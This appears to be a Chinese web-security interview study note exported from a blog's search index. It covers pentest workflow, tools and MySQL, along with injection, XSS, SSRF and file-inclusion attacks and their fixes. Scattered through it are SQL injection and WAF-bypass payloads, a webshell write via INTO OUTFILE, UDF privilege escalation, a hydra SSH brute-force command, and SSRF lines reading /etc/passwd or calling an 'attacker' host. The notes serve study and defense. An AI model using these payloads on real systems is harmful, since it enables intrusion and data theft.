<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[技术面试问题]]></title>
    <url>%2F2019%2F03%2F05%2F%E9%9D%A2%E8%AF%95%2F</url>
    <content type="text"><![CDATA[最具挑战性的挑战莫过于提升自我。——迈克尔·F·斯特利 CTF说一个印象深刻的CTF的题目 Padding Oracle-&gt;CBC-&gt;密码学(RSA/AES/DSA/SM) CRC32 反序列化漏洞 sql二次注入第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列， 暴库 group_concat(schema_name) from information_schema.schemata 暴表 group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39; 获取数据 concat(flag) from flag 修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。 Python爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）并发(多线程、线程池、协程、三个程之间的区别)进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。 常用的标准库 functools itertools 迭代器 count/cycle/repeat chain groupby 把迭代器中相邻的重复元素挑出来放在一起 concurrent.futures ThreadPoolExecutor hashlib md5 sha1 sha256 sha512 logging sys.argv argparse读取命令行参数 pickle 序列化工具 re 正则 collections 多种数据类型 namedtuple OrderedDict Counter os 系统相关的函数 DJANGO和FLASK区别和使用ORMpython安全工具编写/源码阅读证明能力 python安全工具开发 python项目，记一下技术细节 密码学RSADESAES国内SM系列风险评估流程 三要素 资产：资产价值 威胁：威胁主体、影响对象、出现频率、动机等 脆弱性：资产弱点的严重程度‘ 代码审计Fority SCA审计JAVA代码fortify用到什么模块? 过滤器 自定义规则 生成报告 Seay审计PHP代码源码阅读应急响应具体流程模型 https://zhuanlan.zhihu.com/p/26542790 PDCERF模型 Prepare（准备）：准备用来检测的工具和人 Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告 Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平 Eradication（根除） Recover（恢复） Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解 实例DDOSDDOS是什么分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。 DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。 如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机 实例我司网站www.catroot.cn的IP 223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。 https://www.zhihu.com/question/19581905 网络设备设施 拼带宽，加大带宽，但是成本太高 使用硬件防火墙 选用高性能设备 抗D思想和方案 负载均衡 花钱买流量清洗服务 CDN：web层，比如cc攻击 分布式集群防御 高防：防大部分攻击，udp、大型的cc攻击 预防为主 系统漏洞 系统资源优化： 过滤不必要的服务和端口 限制特定流量：检查访问来源做适当限制 主机被入侵 优先提取易消失的数据 内存信息 系统进程free -m 路由信息tracert ifconfig查看网卡流量，检查网卡的发送、接收数据情况 NetHogs实时监控带宽占用状况 查看Linux系统日志 /var/log ClamAV杀毒软件 渗透测试流程相关渗透测试流程 项目访谈 信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息 漏洞扫描：Nessus, AWVS 手动挖掘：逻辑漏洞 验证漏洞 修复建议 （如果有）基线检查/复验漏洞 输出报告 概述 测试基本信息 测试范围 测试时间 测试任务 测试过程 信息安全风险综合分析 整体风险分析 风险影响分析 系统安全分析 安全漏洞列表 解决方案建议 复测报告 渗透测试项目用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。 如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。 渗透测试具体实施17年OWASP TOP10 注入:sql,nosql,ldap,os 失效的身份认证: 敏感信息泄漏 XXE XML外部实体 失效的访问控制：管理页面仅能管理员权限访问；越权漏洞 安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用 XSS 不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆 使用含有已知漏洞的组件：比如structs2框架 不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应 常见的Web安全漏洞 SQL注入 XSS 文件遍历、文件上传、文件下载 垂直越权、水平越权 逻辑漏洞 挖过什么逻辑漏洞订单任意金额修改相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。 预防思路： 订单需要多重效验 订单数值较大的时候需要人工审核 验证码回传漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件 预防思路： response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加 如果要进行前端验证的话也可以，但是需要进行加密 未进行登陆凭证验证有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。 预防思路： 对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证 接口无限制枚举 某电商登陆接口无验证导致撞库 某招聘网验证码无限制枚举 某快递公司优惠券枚举 某电商会员卡卡号枚举 预防思路： 在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。 注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。 验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。 优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。 cookie设置存在缺陷 Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举. cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法 越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限 预防思路 cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。 用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。 cookie中设定session参数，以防cookie可以长时间生效。 根据业务不同还有很多方法 找回密码功能缺陷 单纯读取内存值作为用户凭证 电商系统加车、下单漏洞 你常用的渗透工具有哪些，最常用的是哪个？扫描:Nessus,AWVS,NiktoSQLmap https://blog.csdn.net/ski_12/article/details/58188331 常用参数 123456789101112131415161718192021-u 单个URL -m xx.txt 多个URL-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot; 作为服务器客户端，直接连接数据库--data post/get都适用-p 指定扫描的参数-r 读取文件-f 指纹信息--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host等等http头的修改--threads 并发线程 默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level=LEVEL 执行测试的等级（1-5，默认为 1）–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险–current-db / 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户 常用的tamper 本地：sqlmap-tamper分类.xlsx 123456base64encode.py #转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用/**/分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xx Nmap12345678910111213141516nmap hostname/ip或者多个ip或者子网192.168.123.*-iL ip.txt 扫描ip.txt的所有ip-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描-O 探测操作系统信息-sV 查找主机服务版本号-sA 探测该主机是否使用了包过滤器或防火墙-sS 半开扫描，一般不会记入日志，不过需要root权限。-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-sN TCP空扫描-F 快速扫描-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-p 指定端口/端口范围-oN 将报告写入文件-v 详细信息-T&lt;0-5&gt; 设定速度 Nmap还可以用到爆破等一些脚本 123--script all 使用所有脚本--script=sql.injection.nse sql注入--script=&quot;smb*&quot; 扫smb系列 Metasploit使用内置模块。HR：常用的模块有哪些？ tcp反向链接 msfvenom Hydra密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp， 12hydra IP -l loginname -P pass.txt PROTROCLhydra 127.0.0.1 -l root -P pass.txt ssh kali信息收集工具 dig whois host:查询dns服务器 nslookup 域名枚举：fierse -dns maltego onesixtyone 流量分析WireSharkCTF 描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)数据库注入 https://www.zhihu.com/question/22953267 MySQL面试题MySQL存储引擎？ InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束 为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在 SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合 InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上 InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键 MyISAM：访问速度快，不支持事务，逐渐被淘汰 MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。information_schema用的是该引擎 MERGE、Archive等等不常用的 什么是事务？事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。 举个银行应用的典型例子： 假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤： a.检查A的支票账户余额高于2000元； b.从A的支票账户余额中减去2000元； c.在A的储蓄账户余额中增加2000元。 这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。 读锁和写锁读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。 MySQL的索引索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。 ORDER BY在注入的运用GPC是什么？GPC之后怎么绕过？如果magic_quotes_gpc=On，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。 Mysql一个@和两个@什么区别 @为用户变量，使用SET @var1=1赋值 @@ 为系统变量 ，包括全局变量show global variables \G;和会话变量show session variables \G; 注入/绕过常用的函数 基于布尔SQL盲注 left(database(),1)&gt;&#39;s&#39; ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ ascii(substr((select database()),1,1))=98 ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 regexp正则注入 select user() regexp &#39;^[a-z]&#39;; select user() like &#39;ro%&#39; 基于报错的SQL盲注 Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a; MySQL存储过程各种写shell的问题 写shell用什么函数？ select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39; dumpfile file_put_contents outfile不能用了怎么办？ select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;可以UDF提权 https://www.cnblogs.com/milantgh/p/5444398.html dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。 sleep()能不能写shell？ 写shell的条件？ 用户权限 目录读写权限 防止命令执行：disable_functions，禁止了disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source，但是可以用dl扩展执行命令或者ImageMagick漏洞 https://www.waitalone.cn/imagemagic-bypass-disable_function.html open_basedir: 将用户可操作的文件限制在某目录下 #### 注入类型 基于报错注入 基于布尔的注入，根据返回页面判断条件真假的注入 基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 宽字节注入 联合查询，可以使用 union 的情况下的注入。 堆查询注入，可以同时执行多条语句的执行时的注入。 SQL注入的原理通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。 过waf https://blog.csdn.net/wjy397/article/details/53263281 确定waf类型，狗、盾、神、锁、宝、卫士 使用注释符号或者特殊符号或者多个特殊符号重复 123456789# ---- - //5.6.12特性，需要加空格--+///**/ //c风格注释/**//**/ //多个注释/*letmetest*/; 科学记数法id=0e1union select 空白字符SQLite3 0A 0D 0C 09 20 MySQL5 09 0A 0B 0C 0D A0 20 PosgresSQL 0A 0D 0C 09 20 Oracle 11g 00 0A 0D 0C 09 20 MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 123. 使用sql内置函数或者关键字&gt; 报错注入 https://blog.csdn.net/like98k/article/details/79646512 常用extractvalue updatexml 报错注入 UPDATEXML (XML_document, XPath_string, new_value); or updatexml(1, concat(0x7e, (version()), 0x7e), 0); select * from users where id = 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0); version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name=’users’ limit 0,1 floor() ceil() Mid(version(),1,1) Substr(version(),1,1) Substring(version(),1,1) concat(version(),’|’,user()); concat_ws(‘|’,1,2,3) Char(49) Hex(‘a’) Unhex(61) 过滤了逗号 (1)limit处的逗号： limit 1 offset 0 (2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1) 12344. 利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入5. 畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过7. %0a换行7. 多次URL编码，waf的一根筋过滤 unlencode base64 json binary querystring htmlencode unicode php serialize 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495968. http参数污染，`id=1&amp;id=2&amp;id=3` `id=1,2,3`### 如何进行SQL注入的防御1. 关闭应用的错误提示 7. 加waf2. 对输入进行过滤3. 限制输入长度4. 限制好数据库权限，drop/create/truncate等权限谨慎grant5. 预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。6. 数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md57. 清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。8. 具体的语言如何进行防注入，采用什么安全框架&gt; 作者：没啥意思链接：https://www.zhihu.com/question/22953267/answer/23222069来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&gt; SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。&gt; 我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。### mysql的网站注入，5.0以上和5.0以下有什么区别？10年前就出了5.0，现在都到5.7了，没啥意义的问题- 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。- 5.0以下是多用户单操作，5.0以上是多用户多操做。### SQL和NoSQL的区别SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库#### SQL优点关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。1. 结构稳定，不易修改，常用联表查询2. 查询能力高，可以操作很复杂的查询3. 一致性高，处理数据会使用封锁保证数据不被改变4. 表具有逻辑性，易于理解#### SQL缺点1. 不适用高并发读写2. 不适用海量数据高效读写3. 层次多，扩展性低4. 维护一致性开销大5. 涉及联表查询，复杂，慢#### NoSQL优点采用键值对存储数据1. 由于数据之间没有关系，所以易扩展，也易于查询2. 数据结构灵活，每个数据都可以有不同的结构3. 由于降低了一致性的要求，所以查询速度更快#### 比较非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。#### MongoDB注入方式利用正则：找到y开头的name `db.items.find(&#123;name: &#123;$regex: &quot;^y&quot;&#125;&#125;)`一些payload1. `?login[$regex]=^&amp;password[$regex]=^`2. `?login[$not][$type]=1&amp;password[$not][$type]=1`## XSS CSRF XXE### CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ &gt; xss学习 https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。### CSRF、SSRF和重放攻击有什么区别？- CSRF是跨站请求伪造攻击，由客户端发起 - SSRF是服务器端请求伪造，由服务器发起 - 重放攻击是将截获的数据包进行重放，达到身份认证等目的### 啥是同源策略，跨域有几种方式？&gt; http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html浏览器安全的基石是&quot;同源政策&quot;，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制： - Cookie、LocalStorage 和 IndexDB 无法读取。 - DOM 无法获得。 - AJAX 请求不能发送### 如何规避同源策略？#### JSONP向服务器请求json数据回调，一般请求URL会加上`&amp;callback=xx`​```bashfoo(&#123; &quot;ip&quot;: &quot;8.8.8.8&quot;&#125;); 由于&lt;script&gt;元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。 JSONP的劫持 http://blog.knownsec.com/2015/03/jsonp_security_technic/ 防御： 验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行 随机token WebSocketWebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 CORS(重点) http://www.ruanyifeng.com/blog/2016/04/cors.html CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。 CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出Acess-Control-Allow-*的字段 与JSONP的比较CORS与JSONP的使用目的相同，但是比JSONP更强大。 JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。 DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？ https://www.zhihu.com/question/26628342 存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子； CSP策略 https://www.zhihu.com/question/21979782 浏览器内容安全策略，减少xss攻击。 SSRF漏洞原理是什么？利用时有哪些伪协议？ secpulse.com/archives/65832.html 漏洞原理利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。 ssrf用处 探测内网信息,用协议探ftp%26ip={ip}%26port={port} 攻击内网或本地其他服务 穿透防火墙 漏洞处 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 在线处理工具 举几个例子： 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。 邮件系统就是接收邮件服务器地址这些地方。 文件就找ImageMagick，xml这些。 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。 绕过姿势 http://example.com@127.0.0.1 利用IP地址的省略写法绕过,[::]绕过localhost DNS解析 http://127.0.0.1.xip.io/ 可以指向任意ip的域名：xip.io 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过 利用协议 https://www.secpulse.com/archives/70471.html 接受ua为curl的时候，支持的协议有 使用curl -v http://xx.com/ssrf.php?url=sxxx 123456789101112file://ssrf.php?url=file:///etc/passwordDict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher:// 漏洞修复 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html 检查是否为内网IP地址 绕过方法: 利用八进制IP地址绕过 利用十六进制IP地址绕过 利用十进制的IP地址绕过 利用IP地址的省略写法绕过 最好的做法：IP地址转换为整数再进行判断 获取真正请求的host 如何正确的获取用户输入的URL的Host？ 最常见的就是，使用http://233.233.233.233@10.0.0.1:8080/、[http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname](http://10.0.0.1/#233.233.233.233%E8%BF%99%E6%A0%B7%E7%9A%84URL%EF%BC%8C%E8%AE%A9%E5%90%8E%E7%AB%AF%E8%AE%A4%E4%B8%BA%E5%85%B6Host%E6%98%AF233.233.233.233%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8D%B4%E6%98%AF10.0.0.1%E3%80%82%E8%BF%99%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E7%9A%84%E6%98%AF%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AF%B9URL%E8%A7%A3%E6%9E%90%E7%9A%84%E9%94%99%E8%AF%AF%EF%BC%8C%E6%9C%89%E5%BE%88%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%94%9A%E8%87%B3%E4%BC%9A%E7%94%A8%E6%AD%A3%E5%88%99%E5%8E%BB%E8%A7%A3%E6%9E%90URL%E3%80%82%E4%BD%BF%E7%94%A8urllib.parse%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E7%9C%9F%E6%AD%A3%E7%9A%84hostname) 只要Host只要不是内网IP即可吗？ host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查 只要Host指向的IP不是内网IP即可吗？ 不一定，可能会30x跳转 归纳 解析目标URL，获取其Host 解析Host，获取Host指向的IP地址 检查IP地址是否为内网IP 请求URL 如果有跳转，拿出跳转URL，执行1 在浏览器端，Referer可以篡改吗？通过插件修改，一般抓包修改 xss盲打到内网服务器的利用xss代码层防御文件上传下载遍历漏洞原理 容器漏洞，解析漏洞 修复方案文件包含漏洞 https://blog.csdn.net/fuckcat_2333/article/details/52132559 类型 本地文件包含 远程文件包含 ：即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。 PHP文件包含函数 include() ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 inclue_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 利用 读取敏感文件 远程包含shell 图片上传并包含图片shenll 使用伪协议 包含日志文件GetShell 截断包含 修复方案 禁止远程文件包含 allow_url_include=off 配置 open_basedir=指定目录，限制访问区域。 过滤../等特殊符号 修改Apache日志文件的存放地址 